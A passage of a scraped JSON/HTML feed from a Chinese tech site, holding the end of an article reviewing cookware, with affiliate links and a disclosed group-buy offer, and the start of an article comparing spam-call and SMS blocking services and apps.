href=\"https://www.amazon.cn/gp/product/B0009JKG9M/ref=ppx_yo_dt_b_asin_image_o03_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">例如上图右上其实是由两个深浅不一但口径相同的平底锅组成的一个炖锅，</a>而我最满意的是较浅的那个「锅盖」，因为它可以作为一个绝佳的盘子使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu80db34tcvciqadag.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B00063RWT8/ref=ppx_yo_dt_b_asin_image_o01_s01?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">盛放在铸铁锅里的藤椒鸡</a></figcaption></figure><p>像藤椒鸡这种可以吃很久但绝不能凉掉的「硬菜」是不适合装在普通盘子里的，过往作为一道「放得粗」的西南人民喜爱也极其 Local 的菜，我们喜欢直接端着大锅上桌，即便并不需要加热（属于容易焦糊的干锅类食物）。<a href=\"https://www.amazon.cn/gp/product/B00063RWT8/ref=ppx_yo_dt_b_asin_image_o01_s01?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">但用上可以长时间保温的铸铁锅就不一样了，</a>呼啦呼啦酒足饭饱仍有余温。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu80tb34tcvciqadb0.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B00008GKDN/ref=ppx_yo_dt_b_asin_image_o08_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">Lodge 的浅口烤盘是做披萨时的绝佳助力</a></figcaption></figure><p>我喜欢做薄底披萨，它成功的关键是能否控制住合理的时间内即能保证表面的蔬菜、熏肉和芝士恰到好处，又能让饼皮酥脆内里软绵。一块靠谱的披萨石必不可少，但毕竟受制于家用烤箱的能力，<a href=\"https://www.amazon.cn/gp/product/B00008GKDN/ref=ppx_yo_dt_b_asin_image_o08_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">所以我还喜欢在上面多叠一口铸铁锅，</a>同时它也方便取出披萨。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu81db34tcvciqadbg.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B001TH8EFQ/ref=ppx_yo_dt_b_asin_image_o05_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">用 Staub 椭圆铸铁锅做的圣诞烤鸡</a></figcaption></figure><p>烤鸡的时候我们通常需要经历两次烤炙，一次是用中火把肉烤熟，传统做法里这一步需要用锡箔纸裹住鸡肉保证其软嫩避免干柴，再而是用最高火里短时间爆烤上色用脆皮和奇妙的梅拉德反应增香。<a href=\"https://www.amazon.cn/gp/product/B001TH8EFQ/ref=ppx_yo_dt_b_asin_image_o05_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">试试用 Staub 的椭圆形铸铁锅替代单薄的锡箔纸完成第一次炙烤，</a>而第二次爆烤也只需要揭开盖儿不必弄得满手油污。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu82db34tcuopj7v10.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B00FZGBHO2/ref=ppx_yo_dt_b_asin_image_o01_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">池永铁工章鱼烧铁板</a></figcaption></figure><p>而当我们做章鱼烧的时候一定需要一个热容量高的锅子，因为这样它才能提供稳定的热能让丸子表面焦香内里也熟得均匀。<a href=\"https://www.amazon.cn/gp/product/B00FZGBHO2/ref=ppx_yo_dt_b_asin_image_o01_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">一把古朴厚实的池永铁工章鱼烧铁板</a>不仅可以做出恰到好处的绝佳小丸子，更能让我体会这种传统小吃背后藏着的时代岁月。</p>\n<h2>不粘真的那么重要吗</h2>\n<p>说到锅子不得不提的就是「不粘」，无论是传说中被保养得油光水滑世代相传的不粘铁锅，还是令人欲罢不能的各种涂层不粘锅，好像当试图具象多数人对锅的主要需求时，首先脱口而出的一定是不粘。我们先来聊聊锅为什么会粘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu82lb34tcvciqadc0.jpeg\"></figure><p>以生活中最常见也最容易粘锅的煎蛋为例，首先从物理层面看，其实不止是铁锅，包括不锈钢、玻璃等一些我们觉得「光滑」的锅子表面都是凹凸不平的，食材渗透到这些坑洼里导致粘连是最常见的原因之一。其次就是化学变化，例如用铁锅煎蛋，锅子的铁元素与鸡蛋蛋白质上的硫生成共价键导致粘连，另一个原因就是其它分子间的作用力导致，这里就不展开细讲，总的来说锅子与食材粘连有很多原因，但都是有迹可循。</p>\n<p>最「高效」的解决方案当然就是目前市面上最常见的化学涂层不粘锅，虽然看起来好像这种锅子才流行了十数年，但其实它已经有近百年的历史，并不是属于现代的黑科技。可尽管如此，并没有和其它科技发明一样随着时间的发展无限趋近于「完全安全」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu835b34tcuopj7v1g.jpeg\"></figure><p>目前市面上在售的化学涂层不粘锅通常使用一种名为特氟龙的材料，它主要由世界上已知最强力共价键之一的碳氟键组成，原则上它几乎不会与任何其它物质反应，所以也就实现了我们梦寐以求的「不粘」特性，但世上总没少十全十美的好事儿。</p>\n<p>特氟龙在常态下是无毒的，但是在高温下（通常超过 260℃ 之后）会发生反应，释放出有毒物质，并且特氟龙涂层只是「相对程度的耐磨」，例如商家就会建议你不要使用金属锅铲。不过至今我看到的很多文献资料对特氟龙的界定或分析都有不少出入，前述是一些被广泛认可的描述，可是深挖下去例如有毒物质究竟有多毒、什么样的程度才会让它脱落和误食脱落后的铁氟龙涂层究竟能否被人体无毒代谢等都很难有一个绝对权威的解释。</p>\n<p>我家里是没有任何化学涂层不粘锅的，主要原因是我认为烹饪本该就是一件轻松愉悦的事儿，我不希望在整个过程中还要刻意自查是否「姿势正确」。另外可能因为我有一定程度洁癖的原因，我做不到「不粘锅用完后清水冲冲就好」，所以我想象中无论不粘锅还是做完煲仔饭的陶锅，我的清洗流程都会是相似的，只是可能前者用海绵刷，后者用钢丝球的区别而已——而这与我使用化学涂层不粘锅将要耗费的精力相比是微不足道的。</p>\n<p>再而，不是只有化学涂层才能实现不粘。</p>\n<h3>养铁锅是厨房匠人的禅修</h3>\n<p>我想你可能已经发现我前文一直强调「化学涂层不粘锅」，就是因为我觉得不粘锅和化学涂层是两回事儿，也有不比化学涂层就能不粘的锅，例如平平无奇的大铁锅。</p>\n<p>还是之前提到过的，很多时候无论是烹饪者还是干饭人，大家都有一个共识就是「铁锅做出来的食物会更好吃」，但它常常不会是很多人的第一选择就因为它「请神容易送神难」。要想让家里的铁锅好用，不仅要每次清洗后烤干防锈，还得抹油养锅，不然它就是灾难。</p>\n<p>防锈容易理解，简单且不专业的说说养锅。养锅的操作就是在锅烧干加热到一定程度后抹上一层薄薄的食用油然后在其冒烟的同时关火，目的是为了形成诸如前文提到的不粘油膜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu83db34tcu4bur2kg.jpeg\"><figcaption>我在用铁锅的内壁</figcaption></figure><p>我们抹上去的油在高温以及铁元素的催化下会经历一系列的分解、氧化和聚合反应，最后生成一层同样「相对坚固」的保护膜，可以在下次烹饪的时候避免食材与锅子粘连，但从耐用和实用性来讲它肯定不如特氟龙涂层，不过就我自身的使用至少在每次烹饪后我只需要用海绵和洗洁精轻轻一擦就能清理干净，同时这个油膜虽然从名字包括看起来都给人一种「黏糊」的感觉，但其实你用手擦碰是不会残留在手上的。</p>\n<p>精心养过的铁锅使用民间通常的说法是每次使用之后一定不要用洗洁精和坚硬的锅刷刷洗，因为这样会洗掉油膜让所有的努力功亏一篑，但我有另外一种想法。我们都知道油脂在反复加热，包括长时间暴露在空气中后变质会产生数百种致癌物，所以尽管我目前暂未查到详细的关于油膜成分以及安全性的资料，但我认为在每次使用和保养后它一定会多多少少残留一些未发生反应生成油膜的油脂，如果任其不断残留叠加那肯定会生成足以危害健康的物质，所以我每次使用后都会先用洗洁精和海绵刷洗一遍锅身，再进行养锅步骤，每次使用前也先用清水冲洗一下才开始烹饪，目前使用体验依然是一口易用的不粘铁锅。我不知道上述这些解释及我「自认为合理」的使用习惯是否正确，欢迎有相关专业知识的读者不吝赐教。</p>\n<p>但总的来说，我认为这口稍费心思的铁锅是我厨房的得力助手之一，毕竟过往在朋友家操持厨房的经历也体验过化学涂层不粘锅，我并不觉得后者更胜一筹；最重要的是，每次养锅用锅都有一种莫名且神秘的满足感，就像是在对厨房之神献祭一场庄重的礼拜。</p>\n<h3>也可以试试物理层面的防粘</h3>\n<p>如果总是对不明就里的化学反应心生畏惧，不妨试试利用物理特性实现不粘的锅子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu83lb34tcu4bur2l0.jpeg\"><figcaption>KANDA 绣渤意不锈钢炒锅</figcaption></figure><p>这口锅是问路让我试用的，不然我应该不会买任何形态的不锈钢炒锅，因为它的特质就决定了自己是一个交际花，所以我更倾向于不锈钢材质的小奶锅或者烤盘（也要叠一层锡纸才能进烤箱）。但真正用上这口锅之后我只能惊叹食器的奥秘是无穷的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/b6e4daa21819b04098504542b0035396.jpg\"><figcaption>荷叶纹和聚水效果</figcaption></figure><p>特别是下过雨后，相比其它植物上湿哒哒的叶片，我们总是能看到荷叶上凝聚着的巨大水滴，当水滴足够大时它会将荷叶压到倾斜最后滑入水中。过去以为是荷叶的表面太过光滑，其实不然，之所以能形成这样的疏水效应恰好是因为它表面遍布着密密麻麻的乳突，乳突中布满空气使得水滴因为表面张力总是形成球状最终滚落。</p>\n<p>绣渤意的锅璧就仿照了这种特性，通过细密的凸点结构撑起水油隔离膜，最大程度减少食物与锅底接触，也就达到了一定程度的防粘效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu84db34tcuopj7v20.jpeg\"></figure><p>在实际使用中即便是大火爆炒，也很难会出现糊底的情况，虽然最终效果仍然比不上化学涂层不粘锅或者保养得当的铁锅，但它可是不锈钢啊，不用保养，钢丝球加洗洁精随便刷，冲洗干净后擦干即可——特别是拥有洗碗机的我，用完直接塞进去隔天取出又是一口新锅。</p>\n<p>如果不是因为铁锅于我还有功能性之外的意义，不然我想我应该会放弃铁炒锅。</p>\n<p>而除了绣渤意这款铁锅，还有另一个非常想要推荐的是 Neoflam，它可以说是我厨房里前三喜爱的锅之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu855b34tcu4bur2m0.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B00QRL0NIA/ref=ppx_yo_dt_b_asin_image_o00_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">Neoflam Midas Plus 九件套</a></figcaption></figure><p><a href=\"https://www.amazon.cn/gp/product/B00QRL0NIA/ref=ppx_yo_dt_b_asin_image_o00_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">我购买的是 Midas Plus 系列，</a>Neoflam 的锅相比于纯铁锅或不锈钢锅也算是属于涂层锅的一类，但它的涂层是对人体完全无害的陶瓷一属，而金属部分则是实用导热性和热容量都极佳的铝合金，简单来说它既是将陶瓷包裹在了铝合金表面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu85db34tcu4bur2mg.jpeg\"><figcaption>同样优秀的不粘性</figcaption></figure><p>相比于纯金属，主要成分为二氧化硅的陶瓷更不容易与食物发生粘合反应，尽管从不粘性来讲它排在前问提到的几个锅之后，但它却更是一口综合能力完胜的锅子——坚硬的陶瓷表面耐高温耐磨损可以直接送到烤箱中使用，也能丢进洗碗机，可以适应任何性质的食物不会发生腐蚀反应，而且铝合金材质拥有非常优秀的保温能力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu85tb34tcvciqadcg.jpeg\"></figure><p>而这个九件套除了四口尺寸不一的锅子（奶锅、炖锅、煎锅和炒锅）、一个可拆卸手把外，还提供各两个玻璃和密封硅胶盖，后者可以直接盖上放到冰箱里，并且不影响上面叠放别的东西。如果说之前提到的锅子过于「隆重」让你觉得自己好像用不太上，那么这组 Neoflam 几乎就是任何人类都会得心应手的基础食器。</p>\n<h2>你需要一口什么样的锅</h2>\n<p>所以看到最后，当再问你「你需要一口什么样的锅？」时，你会怎么回答？——无论你怎么回答，我想应该不会再是「去商场看看随便买口便宜的得了，甚至能消费达标兑换最好」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu86lb34tcvciqadd0.jpeg\"><figcaption>万古烧菊花锅</figcaption></figure><p>再天花乱坠的锅子也只是一个加热食物的工具这点毋庸置疑，但在「加热食物」这个过程中我们是可以用一些巧思或者实用性之外的做作来增添风趣的。就像前文提到的 Neoflam 实用好清理，但我还是会折腾一个万古烧的菊花锅来煮粥，即使我知道出品的米更香只是因为我过分做作，但我就是能在每一口里吃出快乐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu86tb34tcu4bur2n0.jpeg\"><figcaption>珍珠天妇罗炸锅</figcaption></figure><p>而大铁锅也能方便油炸食物但我还是会买一口自带温度计的珍珠天妇罗炸锅，其实如果你耐心一些，有的食材更适合 180℃ 油温若是超过了口感会跌落好几个层次。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu87db34tcvt9nu9i0.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B001T19AQE/ref=ppx_yo_dt_b_asin_image_o06_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">远藤商事不锈钢奶锅</a></figcaption></figure><p>但即便是一口简简单单的不锈钢小奶锅，你可以应该关注它的材质是 18-10、316 还是 304 不锈钢，它们的成本和耐腐蚀性都不尽相同，也是你为什么觉得「好像我家的奶锅没有别人的那个好用」的原因，而你再花点时间<a href=\"https://www.amazon.cn/gp/product/B001T19AQE/ref=ppx_yo_dt_b_asin_image_o06_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">挑选一个带缺口便于倾倒并且有刻度的，</a>日后使用起来也会更开心。</p>\n<p>所以你需要一口什么样的锅，不是最好用的那个，而是能让你感到快乐的这个。</p>\n<hr>\n<h2>一个福利</h2>\n<p>这篇文章其实在选题箱里扔了很久，一直没有动笔是因为找不到好的切入点，被启动的契机也是问路突然给我寄了神田的不锈钢锅体验——少数派电商选品在上架前都会让不同编辑亲自试用评价。在用锅上我其实是一个思想比较保守的人，锅的不粘性对我来说一直都是「有最好没有就慢慢洗」，但这口锅的确是颠覆了我对不锈钢这个材质以及「物理防粘」的旧认知。</p>\n<p>而厨具在很多人包括我们自己看来是和少数派不太「搭边」的品类之一，所以在正式上架前我们联系厂商做了一个小小的团购活动，<strong>即 9 月 8 日前可以以 ¥199 的价格（该锅日常销售均价为 ¥299）购入此锅，且数量有限。</strong></p>\n<p><a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654813322413\" target=\"_blank\">大家可以通过这个链接在少数派商城购买，</a>注意购买前领取优惠券：<strong>手机淘宝会自动领券，PC 淘宝在详情页顶部点图片领券。</strong></p>\n<span class=\"ss-externalProduct\" title=\"绣渤意荷叶系列不锈钢炒锅\" type=\"externalProduct\" link=\"https://item.taobao.com/item.htm?ft=t&amp;id=654813322413\" through-price=\"299\" price=\"199\" cover=\"https://cdn.sspai.com/2021/09/03/2fdf9ee56b43444c9b4efa134a1c5d05.jpeg\" description=\"家用无涂层不粘锅。\" date-start=\"2021-09-03\" date-end=\"2021-09-08\"> </span><p>我们会根据这次的效果酌情考虑在同类产品上的选品侧重。</p>\n<p>同时，文中所有的描述和使用体验——包括这口神田不锈钢不粘锅——都是我真实客观的描述，没有接受任何指导和要求，而除了神田之外的所有锅具都是我自费购买，且大部分都是亚马逊海淘，我都有附上购买链接，大家感兴趣的可以跳转购买，即便远渡重洋但都没有遇到过商品损坏的情况。</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68556"},{"title":"这些骚扰电话 / 短信拦截工具，帮你告别「澳门赌场」","date":"2021-09-03 03:30:26","description":"\n<p>每当各种购物节来临时，商家的促销短信总是络绎不绝，平时生活里，也会不时有中介、楼盘，乃至运营商会给你推销各种产品。相信这个问题许多 iPhone 用户都十分头疼，那有什么好工具可以让手机保持清净呢？</p>\n<h2>阅读指引</h2>\n<p>本文分为拦截骚扰电话与骚扰短信两个部分，根据工具运营方分为运营商、系统自带、第三方工具三类。</p>\n<p>下文提及的产品有：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>运营商</th>\n<th>系统自带</th>\n<th>来电、短信拦截类</th>\n<th>语音助手</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>天翼防骚扰</td>\n<td>MIUI AI 通话</td>\n<td>腾讯手机管家</td>\n<td>华小秘</td>\n</tr>\n<tr>\n<td>联通手机管家</td>\n<td>OriginOS 电话秘书</td>\n<td>360 手机卫士</td>\n<td>讯飞来电（收费）</td>\n</tr>\n<tr>\n<td>移动高频骚扰电话防护</td>\n<td> </td>\n<td>防骚扰大师</td>\n<td>腾讯电话助理（收费）</td>\n</tr>\n<tr>\n<td>防骚扰信息服务平台</td>\n<td> </td>\n<td>CC 来电拦截 N+</td>\n<td>天翼防骚扰+（收费）</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>短信精灵</td>\n<td>沃助理（收费）</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>通知滤盒（收费）</td>\n<td>和留言（收费）</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>熊猫吃短信（收费）</td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>落格信使（收费）</td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>国家反诈中心</td>\n<td> </td>\n</tr>\n</tbody>\n</table></figure><p>有部分本文中未提及的产品，可 <a href=\"https://newlearner.larksuite.com/sheets/shtusfhARvAhl3Nr5nS9L3ufheb\" target=\"_blank\">点击此处</a> 查看归纳表格。</p>\n<h2>中国电信、中国联通、中国移动</h2>\n<blockquote><p>开通方法：短信开通 / 微信公众号开通</p></blockquote>\n<p>骚扰电话从运营商那里来，那就在运营商这边解决。移动、联通、电信分别上线了自家的骚扰拦截服务，从运营商环节减少呼入到用户端的骚扰电话。用户只需关注公众号，进行相关设置后即可完成拦截操作。也可以通过发送短信的方式开通防骚扰服务：</p>\n<ul>\n<li>中国移动：发送短信 <code>KTFSR</code> 到 <code>10086</code>\n</li>\n<li>中国电信：发送短信 <code>KTFSR</code> 到 <code>10001</code>\n</li>\n<li>中国联通：发送短信 <code>SJGJ</code> 到 <code>10010</code>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/216b37343111a57b175c7de85f68fe90\"><figcaption>三大服务关注二维码</figcaption></figure><p>从我父母手机的拦截历史数据，中国移动的效果最佳， 7 月分别拦截了 7 个和 14 个外地的骚扰固话；而我的联通号码， 7 月只拦截到 2 个 170 号段拨出的推销电话，8 月手机仍接听到 4 个广告推销电话。电信目前暂无拦截数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/20cdd344ffba1871bfd044bf6c9cb10a\"></figure><p>移动的骚扰拦截设置中，没有提供「按照号码标记」进行拦截的选项，只能拦截如 400、950、951 等号段的电话，相对而言比较固定。联通与电信则分别提供了广告推销、疑似欺诈、国际电话等类别的选项。</p>\n<p>除了基本的号码拦截，中国电信与中国联通分别提供了收费的智能代接听服务 —— 天翼防骚扰+ 与联通智能应答，通过机器人代管接听的方式，实现「以子之矛，攻子之盾」。移动的和留言功能上更偏向语音信箱，一定程度上能够发挥作用。</p>\n<p>缺点是三者的接听过程是在运营商服务器进行的，期间用户无法选择主动接听电话，同时在外卖、快递、出租车等场景可能会给对方带来不便。</p>\n<blockquote>\n<p>一年过去了，用户依然深受骚扰电话困扰，运营商骚扰拦截数远不及呼出的量。</p>\n<p>其中要求基础电信企业（运营商）要加强骚扰电话拦截配套技术系统建设，利用云计算、大数据等技术手段，加强数据共享能力建设，提升骚扰电话识别和拦截能力。专项整治一年过去了，记者梳理发现，三大运营商过去一年至少被政府部门约谈三次，均与“骚扰拦截不力”有关。</p>\n<p>—— 羊城派《<a href=\"https://www.thepaper.cn/newsDetail_forward_3892472\" target=\"_blank\">骚扰电话越拦越多！数据显示运营商整改效果“差评”</a>》（2019 年 7 月）</p>\n</blockquote>\n<h2>电话邦：防骚扰信息服务平台</h2>\n<blockquote><p>开通方法：进入 <a href=\"https://www.donotcall.cn/\" target=\"_blank\">防骚扰信息服务平台</a> → 输入手机号码 + 接收验证码 + 选择拦截类型与拦截时间 → 开通完成</p></blockquote>\n<p>2003 年，美国联邦贸易委员会建立了 Do Not Call （谢绝来电）登记平台，并出台配套法案 <a href=\"http://uscode.house.gov/view.xhtml?req=granuleid:USC-prelim-title15-chapter87A&amp;edition=prelim\" target=\"_blank\"><i>NATIONAL DO-NOT-CALL REGISTRY, CHAPTER 87A, Title 15., U.S. Code</i></a>，这一机制被多个国家相继引入，取得明显的效果。2020 年 6 月，电话邦联合多家企业成立「<a href=\"https://www.donotcall.cn/\" target=\"_blank\">防骚扰信息服务平台</a>」，为用户提供一个拒绝接听商业营销电话与短信的登记平台，并可明确拒绝接收的时间、类型。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/d3c3545a0d0468be850b82fd1dd244f4\"><figcaption>防骚扰信息服务平台</figcaption></figure><p>用户在「防骚扰信息服务平台」完成登记流程后，未来（有效期最长为 3 年）收到来自<strong>与电话邦有合作关系的企业</strong>的商业营销短信与电话频率将会减少。但不包括政府机关、慈善机构、运营商、市场调研公司、有业务关系的组织，而来自<strong>与电话邦无合作关系的企业</strong>的骚扰短信与电话将不会减少。</p>\n<p>此外，防骚扰信息服务平台由电话邦（北京羽乐创新科技有限公司）联合其它企业搭建，换言之，与国外的 DNC 平台相比，这一平台并无法律效力，而在我国，除 <a href=\"https://www.gov.hk/tc/residents/communication/infosec/antispam.htm\" target=\"_blank\">香港特别行政区</a> 外，国内其它地区均无相关法律的支持。</p>\n<h2>MIUI AI 通话、OriginOS 电话秘书</h2>\n<p>有时候看着「人工智障」和骚扰电话对话还是挺有趣的，在 MIUI 12 与 OriginOS 系统中，分别加入了 AI 通话与电话秘书。当用户不便接听、遇到陌生电话来电时，可通过机器人代管接听。接听过程中，对方的语音会被实时转换为文字，并显示在屏幕上，用户可选择看戏模式、字幕模式和文字转语音应答。</p>\n<h3>MIUI AI 通话</h3>\n<p>进入「电话 - AI 通话」，可以对接听音色、自动接听、问候语、常用语、自定义回复进行深度设置，比如自动接听，分为陌生人来电、响铃未接听、符合标记条件的来电，设置选项比较细致。</p>\n<p>除了被动接听，用户也能够通过 AI 通话主动拨出电话，这一功能是专门为听力有障碍与语音有障碍人士设置，用户可通过文字转语音、语音转文字与对方交流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/a86e47d75272f0e2ac0762777327bf35\"><figcaption>MIUI AI 通话</figcaption></figure><p>当遇到骚扰电话时，小爱同学会选择与对方「周旋」，比如房地产推销，小爱同学会提问「房价、楼盘地点、周边环境、配套设施、交通状况」，最后来一句「谢谢，那就先这样吧，再见」收尾，除了音色之外，回答足以以假乱真。外卖、快递场景的默认应答估计会让配送员恼火，「你在什么地方、你大概能呆多久、你是哪家快递的 / 外卖的」，建议在自定义回复中添加场景回复。</p>\n<h3>OriginOS 电话秘书</h3>\n<blockquote><p>感谢 @<a href=\"https://sspai.com/u/ssdog/posts\" target=\"_blank\">一只索狗</a> 提供内容</p></blockquote>\n<p>对于此类的电话秘书功能，对我而言用起来还是有些心理负担的，当然骚扰电话除外，主动打电话联系你的人一般是关系较为亲密的人，或者是来给你提供服务的，用机器回复总觉得不太礼貌，就算一时忙不开，我还是愿意亲自用其它方式告知目前不方便接听。当然，既然系统提供了这样的功能，说明还是有用户需要的，针对三种常见的情况，我也进行了简单的体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/e0d4b651231f23b2450b32e1bbce4c2f\"><figcaption>OriginOS 电话秘书</figcaption></figure><p>对于家人、朋友的日常联系，电话秘书基本以循环语句的套路式回应为主，不会根据具体语句说出针对性的回复，更像是个会应付几句的语音信箱。当语句里面有「快递、外卖、京东」等关键词时，可以自动预设回复，系统提供了一系列的预设语句，涵盖了门口、前台、门卫、收发室等地点，但是不能自定义，灵活性上差了点。另外，在测试过程中，也无法识别近似语义的语句，比如「您订的餐到了」，电话秘书又会回归套路，询问有什么事。</p>\n<p>骚扰电话其实没什么接听的必要，对于这种无用的骚扰，最佳的方法是直接挂断。不过看着骚扰电话和机器人聊天，也是挺有趣的一件事。它与前面的表现差别不大，依旧是套路语句：「X 正在忙，有事儿可以和我说帮你转达、明白了，待会和他说，还有事吗、让他尽快回你」。不过也依旧出现了翻车情况，例如我尝试说出「我是京东金融，是否需要分期」，因为识别出了「京东」而错误的当成了快递，整句的语义识别有待进步。</p>\n<p>OriginOS 目前所提供的电话秘书更像是一个进阶版的语音信箱，并不会根据识别到的语句信息展开具体的对话，只是做了关键词的匹配，停留在表面上「搭话」阶段。而针对外卖、快递等常见语句提供了一定的支持，但语句远远不够丰富和智能。除了完全的自动应答，由于它也支持手动选择回应，在会议等不方便接听的情况下还是有些用处的，但整体相比小爱同学这种「优等生」还是有较大的差距。</p>\n<h2>华小秘、讯飞来电、腾讯智能接听助理</h2>\n<p>除了运营商、系统内置的代接听服务， 还可以选用第三方的服务，如华小秘、讯飞来电（收费）、腾讯电话助理（收费）。当用户未接听来电时，通过预先设置，语音助理会接入代听，并分析对方来电意图，随后通过微信公众号发送通知给用户。</p>\n<blockquote>\n<p>开通方法：</p>\n<ul>\n<li>华小秘：关注微信公众号 <code>华小秘</code> → 按提示设置呼叫转移</li>\n<li>讯飞来电：关注微信公众号 <code>讯飞来电</code> → 按提示设置呼叫转移</li>\n<li>腾讯电话助理：搜索微信小程序 <code>腾讯电话助理</code> 或安装 <code>腾讯手机管家</code> App → 按提示开通服务、设置呼叫转移</li>\n</ul>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/c6c4cc27ddeb27a323e5ff587ecbf0a8\"><figcaption>华小秘、讯飞来电、腾讯电话助理</figcaption></figure><p>经过测试，三者均能成功识别用户来电意图，如快递、朋友来电、广告推销，有趣的是，华小秘识别到对方为推销电话后，会礼貌回绝并挂断电话，不与对方继续纠缠。除了华小秘，讯飞来电、腾讯电话助理均需付费，分别为 8 元/月与 19 元/月。</p>\n<p>与手机内置的语音助手代管接听相比较，云端的代管接听不会受到设备、时间、地点限制，用户只需根据提示设置呼叫转移，预设条件触发后便能够自动代接电话，同时手机能够正常操作。但假设通话过程中需要人工干涉，此时便无能为力，只能待挂机后重新拨打电话给对方，设置了呼叫转移的电话号码还需要额外支付呼叫转移的费用，一般为 0.1 元/分钟。</p>\n<h2>腾讯手机管家、360 手机卫士、防骚扰大师</h2>\n<p>应用下载地址：</p>\n<span class=\"ss-application\" app-id=\"663\"> </span><span class=\"ss-application\" app-id=\"849\"> </span><span class=\"ss-application\" app-id=\"16154\"> </span><p> </p>\n<p>在 iOS 13 中，苹果才开始内置陌生来电静音功能，但实际上并无明显作用，想要摆脱骚扰电话，只能依靠第三方应用。第三方应用借助 CallKit 中 <a href=\"https://developer.apple.com/documentation/callkit/\" target=\"_blank\">Call Directory Extension</a> 将号码识别数据库写入系统，当手机收到来电时，系统会将来电号码与数据库比对，从而实现来电识别。</p>\n<blockquote>\n<p>您可以在 iPhone 上使用 “将未知来电者设置为静音” 或第三方应用来阻止骚扰电话。</p>\n<p>—— Apple 支持</p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/5d9567edb6fa5136518e4336aba02014\"><figcaption>应用首页比较</figcaption></figure><p>腾讯手机管家、360 手机卫士与防骚扰大师三者比较，我个人推荐后者。从功能上来说，360 防骚扰大师仅提供了来电识别与骚扰短信拦截两个功能，界面简洁，设置简单，能够满足用户对骚扰拦截的需求；其次 360 手机卫士与腾讯手机管家中存在较多的广告，索要权限偏多。</p>\n<p>温馨提示：由于 iOS 来电识别使用的是离线数据库，如未开启防骚扰大师的应用通知权限，建议定期打开防骚扰大师更新本地数据库。</p>\n<h2>CC 来电拦截 N+、短信精灵、通知滤盒</h2>\n<p>目前大部分国内厂商的 Android 手机都配备了可联网的骚扰拦截系统。对于使用类原生系统或缺乏本土化的 Android 系统的用户，亦或是有隐私顾虑的用户，可以使用采用基于离线数据库的第三方骚扰拦截应用。</p>\n<p>应用下载地址：</p>\n<span class=\"ss-application\" app-id=\"15720\"> </span><span class=\"ss-application\" app-id=\"16155\"> </span><span class=\"ss-application\" app-id=\"15141\"> </span><p> </p>\n<figure class=\"image 